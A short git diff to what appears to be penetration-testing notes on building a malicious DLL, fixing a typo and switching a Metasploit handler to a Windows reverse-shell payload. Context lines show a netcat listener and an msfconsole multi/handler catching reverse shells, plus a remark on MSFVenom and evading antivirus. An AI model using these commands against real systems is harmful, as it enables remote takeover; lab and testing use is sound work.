@@ -147,7 +147,7 @@ Did not test this yet. But seems 'better' then the cube0x0 implementation
 
 ## Create DLL
 
-MSVenom is you think AV is not a problem. Otherwise build something custom.
+MSVenom if you think AV is not a problem. Otherwise build something custom.
 
 ### MSFVenom
 
@@ -247,7 +247,7 @@ nc -nlvp 80
 
 ```bash
 msfconsole -x "use exploit/multi/handler;\
-set payload generic/shell_reverse_tcp;\
+set payload windows/shell_reverse_tcp;\
 set LHOST 172.16.0.137;\
 set LPORT 80;\
 set ExitOnSession false;\
